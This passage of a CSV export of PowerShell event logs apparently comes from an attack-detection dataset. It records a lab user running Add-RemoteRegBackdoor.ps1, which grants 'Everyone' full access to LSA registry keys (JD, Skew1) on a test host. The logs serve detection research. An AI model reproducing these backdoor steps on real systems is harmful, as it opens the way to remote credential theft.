Ace\"", ""}]}}"
85,68919,2021-12-09 19:54:03.4688027,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1050,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1050,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Calling SetSecurityDescriptor on the key with the newly created Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1050,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Calling SetSecurityDescriptor on the key with the newly created Ace\"", ""}]}}"
86,68920,2021-12-09 19:54:03.4861438,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1052,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1052,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring completed for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1052,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Backdooring completed for key\"", ""}]}}"
87,68921,2021-12-09 19:54:03.4861438,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1054,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1054,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring started for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1054,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Backdooring started for key\"", ""}]}}"
88,68922,2021-12-09 19:54:03.4946660,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1056,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1056,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1056,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"", ""}]}}"
89,68923,2021-12-09 19:54:03.4946660,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1058,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1058,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1058,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\"", ""}]}}"
90,68924,2021-12-09 19:54:03.4946660,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1060,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1060,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating the trustee WMI object with user 'Everyone'"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1060,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Creating the trustee WMI object with user 'Everyone'\"", ""}]}}"
91,68925,2021-12-09 19:54:03.4946660,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1062,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1062,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Trustee"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1062,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\"", ""}]}}"
92,68926,2021-12-09 19:54:03.5039183,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1064,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1064,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Applying Trustee to new Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1064,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Applying Trustee to new Ace\"", ""}]}}"
93,68927,2021-12-09 19:54:03.5039183,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1066,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1066,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Calling SetSecurityDescriptor on the key with the newly created Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1066,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Calling SetSecurityDescriptor on the key with the newly created Ace\"", ""}]}}"
94,68928,2021-12-09 19:54:03.5039183,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1068,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1068,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring completed for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1068,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1] Backdooring completed for key\"", ""}]}}"
95,68929,2021-12-09 19:54:03.5039183,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1070,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: 